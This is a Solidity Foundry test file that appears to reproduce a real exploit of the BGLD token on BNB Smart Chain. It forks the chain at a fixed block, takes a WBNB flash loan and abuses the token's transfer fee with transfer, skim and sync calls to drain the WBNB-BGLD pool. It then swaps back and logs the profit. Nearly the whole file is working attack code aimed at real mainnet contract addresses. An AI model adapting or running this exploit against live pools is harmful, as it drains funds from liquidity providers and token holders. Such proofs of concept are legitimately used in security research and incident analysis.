// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/Arbitrage.sol";

interface IRouter {
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

contract BGLDPocTest is Test {
    struct Fee {
        uint16 burn;
        uint16 mine;
        uint16 liquidity;
        uint16 total;
    }

    Arbitrage public arbitrage;
    IPair public lender;
    IPair public lp;
    IRouter public router;
    Fee public fee;

    function setUp() public {
        // 0xea108fe94bfc9a71bb3e4dee4a1b0fd47572e6ad6aba8b2155ac44861be628ae
        vm.createSelectFork("https://rpc.ankr.com/bsc", 23844529);
        arbitrage = new Arbitrage();
        // BUSD-WBNB
        lender = IPair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
        // WBNB-BGLD
        lp = IPair(0x7526cC9121Ba716CeC288AF155D110587e55Df8b);
        router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // BGLD transfer fee, unit percent
        fee = Fee(2, 4, 4, 10);
    }

    function pancakeCall(
        address initiator,
        uint256 /* amount0 */,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(initiator == address(this), 'Invalid initiator');
        require(msg.sender == address(lender), 'Invalid lender');

        address wbnb = lp.token0();
        IERC20(wbnb).transfer(address(arbitrage), amount1);
        arbitrage.run(data);
    }

    function testBGLDPocByOwner() public {
        uint256 lend_amount = 125 ether;
        (uint256 reverse0, uint256 reverse1, ) = lp.getReserves();
        address wbnb = lp.token0();
        address bgld = lp.token1();
        bytes[] memory payloads = new bytes[](9);
        // transfer WBNB
        payloads[0] = abi.encode(wbnb, 0, abi.encodeWithSignature(
            "transfer(address,uint256)", address(lp), lend_amount
        ));
        // swap for BGLD
        uint256 bgld_amount = router.getAmountOut(lend_amount, reverse0, reverse1);
        payloads[1] = abi.encode(address(lp), 0, abi.encodeWithSignature(
            "swap(uint256,uint256,address,bytes)", 0, bgld_amount * 100 / (100 + fee.total), address(arbitrage), ""
        ));
        // drain BGLD to 1
        bgld_amount = reverse1 - bgld_amount;
        payloads[2] = abi.encode(bgld, 0, abi.encodeWithSignature(
            "transfer(address,uint256)", address(lp), (bgld_amount - 1) * 10
        ));
        payloads[3] = abi.encode(address(lp), 0, abi.encodeWithSignature(
            "skim(address)", address(arbitrage)
        ));
        // sync
        payloads[4] = abi.encode(address(lp), 0, abi.encodeWithSignature("sync()"));
        // swap for WBNB
        payloads[5] = abi.encode(bgld, 0, abi.encodeWithSignature(
            "approve(address,uint256)", address(router), -1
        ));
        address[] memory path = new address[](2);
        path[0] = bgld;
        path[1] = wbnb;
        // manually calculate amount, not use `swap` to save tokens
        uint256 wbnb_amount = reverse0 + lend_amount;
        uint256 swap_out = wbnb_amount / 1 ether * 1 ether;
        // bgld amount is about single digits, can give a little more
        uint256 swap_in = router.getAmountIn(swap_out, 20, wbnb_amount);
        payloads[6] = abi.encode(address(router), 0, abi.encodeWithSignature(
            "swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)",
            swap_in * (100 + fee.total) / 100, swap_out - 0.1 ether, path, address(arbitrage), block.timestamp
        ));
        // repay loan
        uint256 repay_amount = lend_amount * 1003 / 1000;
        payloads[7] = abi.encode(wbnb, 0, abi.encodeWithSignature("transfer(address,uint256)", address(lender), repay_amount));
        // withdraw bnb
        uint256 income_min = swap_out - 0.1 ether - repay_amount;
        payloads[8] = abi.encode(wbnb, 0, abi.encodeWithSignature("withdraw(uint256)", income_min));

        // flash loan
        lender.swap(0, lend_amount, address(this), abi.encode(blockhash(block.number - 1), 0, payloads));
        arbitrage.withdraw();
        console.log("Income:", income_min);
    }

    receive() external payable {}
}
